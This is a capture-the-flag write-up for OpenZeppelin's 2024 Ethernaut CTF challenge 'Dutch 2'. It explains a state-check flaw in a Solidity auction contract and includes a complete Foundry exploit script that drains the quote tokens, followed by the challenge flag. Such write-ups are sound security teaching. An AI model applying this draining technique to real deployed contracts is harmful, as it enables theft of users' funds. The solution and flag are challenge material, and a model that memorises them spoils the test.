---
title: Blockchain - Dutch 2
description: 2024 | Ethernaut CTF | hard-solidity
tags:
    - smart contract
    - solidity
---

## Description

Looks like someone is auctioning a lot of tokens, but they are encrypted. Might be a good idea to bid...

> [Challenge Files](https://github.com/OpenZeppelin/ctf-2024/blob/0527d0e1ea6d729faf753057af6f24cc89584b4e/dutch-2/challenge/project/src/Challenge.sol)

## Solution

- There are some quote tokens and base tokens locked in the auction contract. The objective of the challenge is to drain the quote tokens in the auction contract
- Any user can create an auction. The auction has several stages and the `checkState` modifier checks the current state of an auction based on the block timestamp and specific variables

    ```js
    modifier checkState(States state, Auction storage auction) {
        if (block.timestamp < auction.time.start) {
            if (state != States.Created) revert();
        } else if (block.timestamp < auction.time.end) {
            if (state != States.Accepting) revert();
        } else if (auction.data.quoteLowest != type(uint128).max) {
            if (state != States.Final) revert();
        } else if (block.timestamp <= auction.time.end + 24 hours) {
            if (state != States.Reveal) revert();
        } else if (block.timestamp > auction.time.end + 24 hours) {
            if (state != States.Void) revert();
        } else {
            revert();
        }
        _;
    }
    ```

- The auction creator can take out the bidders' quote tokens via finalize(). Meanwhile, the finalize() function can set the quoteLowest of an auction, which will affect the determination of the auction state, to a user-provided value. Invoke finalize() function with `quote` parameter set to `type(uint128).max` allows sellers to keep the auction in `Reveal` stage and withdraw quote tokens again

    ```js
    function finalize(uint256 id, uint256[] memory indices, uint128 base, uint128 quote)
        public
        checkState(States.Reveal, auctions[id])
    {
        ...
        auction.data.baseLowest = base;
        auction.data.quoteLowest = quote;
        ...
        if (data.totalBase != data.baseFilled) {
            auction.parameters.totalBase = data.baseFilled;
            ERC20(auction.parameters.tokenBase).safeTransfer(auction.data.seller, data.totalBase - data.baseFilled);
        }

        ERC20(auction.parameters.tokenQuote).safeTransfer(auction.data.seller, quote.mulDivDown(data.baseFilled, base));
    }
    ```

- To exploit the vulnerability, the quote amount and base amount of a bid should be chosen carefully. If the auction has only one bid, `amountQuote * type(uint128).max / amountBase` needs to be equal to `quote * type(uint128).max / base`. To keep it simple, `base` can be also set to `type(uint128).max`, and the bidder quote amount should be equal to the base amount

    ```js
    for (uint256 i; i < indices.length; i++) {
        uint256 index = indices[i];
        BidEncrypted storage bid = auction.bids[index];

        uint256 mapIndex = index / 256;
        uint256 bitMap = bidSeen[mapIndex];
        uint256 bitIndex = 1 << (index % 256);
        if (bitIndex == 1 & bitMap) revert();
        bidSeen[mapIndex] = bitMap | bitIndex;

        Math.Point memory commonPoint = Math.mul(sellerPrivateKey, bid.publicKey);
        if (commonPoint.y == 1 && commonPoint.x == 1) continue;

        bytes32 decrypted = Math.decrypt(commonPoint, bid.encrypted);
        if (genCommitment(decrypted) != bid.commit) continue;

        uint128 amountBase = uint128(uint256(decrypted >> 128));

        uint256 quotePerBase = bid.amountQuote.mulDivDown(type(uint128).max, amountBase);
        if (quotePerBase >= data.prevQuoteBase) {
            if (quotePerBase == data.prevQuoteBase) {
                if (data.prevIndex > index) revert();
            } else {
                revert();
            }
        }

        if (quotePerBase < data.resQuoteBase) continue;

        if (data.totalBase == data.baseFilled) continue;

        data.prevIndex = index;
        data.prevQuoteBase = quotePerBase;
        // @note baseFilled should be less than or equal to totalBase
        if (amountBase + data.baseFilled > data.totalBase) {
            amountBase = data.totalBase - data.baseFilled;
        }

        data.baseFilled += amountBase;
        bid.baseAmountFilled = amountBase;
    }

    if (quote.mulDivDown(type(uint128).max, base) != data.prevQuoteBase) revert();

    for (uint256 i; i < bidSeen.length - 1; i++) {
        if (bidSeen[i] != type(uint256).max) revert();
    }

    if (((1 << (indices.length % 256)) - 1) != bidSeen[bidSeen.length - 1]) revert();

    if (data.baseFilled > data.totalBase) {
        revert();
    }
    ```

### Exploitation

- If no new blocks are mined, `block.timestamp` will not be updated in the local simulation
- Use `--slow` flag to send transactions one by one, and prevent local simulation for the `second()` function from reverting via onchain simulation

```js
contract Bidder {
    function bid(AuctionManager auction, uint id, ERC20 token) public returns (uint idx) {
        token.approve(address(auction), 1e10);
        (Math.Point memory pub, bytes32 encrypt) = Math.encrypt(Math.Point(1, 2), 1, bytes32(uint(1e10 << 128)));
        // base, equal to the amount quote tokens remaining in the contract
        idx = auction.addBid(
            id,
            1e10,   // quoteAmount, equal to baseAmount
            auction.genCommitment(
                Math.decrypt(Math.mul(1, pub), encrypt)
            ),
            pub,
            encrypt,
            new bytes32[](0)
        );
    }
}

contract Solve is Script {

    uint256 immutable playerPrivateKey = vm.envUint("PLAYER");
    Challenge challenge = Challenge(vm.envAddress("CHALLENGE"));
    AuctionManager auction = challenge.auction();
    ERC20 baseToken = challenge.baseToken();
    ERC20 quoteToken = challenge.quoteToken();

    function first() public {
        vm.startBroadcast(playerPrivateKey);
        baseToken.approve(address(auction), 1e10);

        auction.create(
            AuctionManager.AuctionParameters(
                address(baseToken),
                address(quoteToken),
                0,  // resQuoteBase
                1e10,  // totalBase
                0,  // minBid
                bytes32(0),  // merkle
                Math.Point(1, 2)  // publicKey
            ),
            AuctionManager.Time(
                uint32(block.timestamp),  // start
                uint32(block.timestamp + 1 minutes),  // end
                uint32(block.timestamp + 2 minutes),  // startVesting
                uint32(block.timestamp + 3 minutes),  // endVesting
                0   // cliff
            )
        );
        
        Bidder bidder = new Bidder();
        quoteToken.transfer(address(bidder), 1e10);
        bidder.bid(auction, 1, quoteToken);
        vm.stopBroadcast();
    }

    function second() public {
        vm.startBroadcast(playerPrivateKey);
        uint256[] memory indices = new uint256[](1);
        indices[0] = 0;

        auction.show(1, 1, abi.encode(
            indices,
            type(uint128).max,
            type(uint128).max
        ));
        auction.finalize(1, indices, type(uint128).max, type(uint128).max);

        require(challenge.isSolved());
        vm.stopBroadcast();
    }
}
```

### Flag

> OZCTF{sT4T3_g0T_T0o_C0nFuS3D_f0R_tH3_4uCt10n}

## References

- [Slow mode and skip simulation for script don't work · Issue #5776 · foundry-rs/foundry](https://github.com/foundry-rs/foundry/issues/5776#issuecomment-1867287499)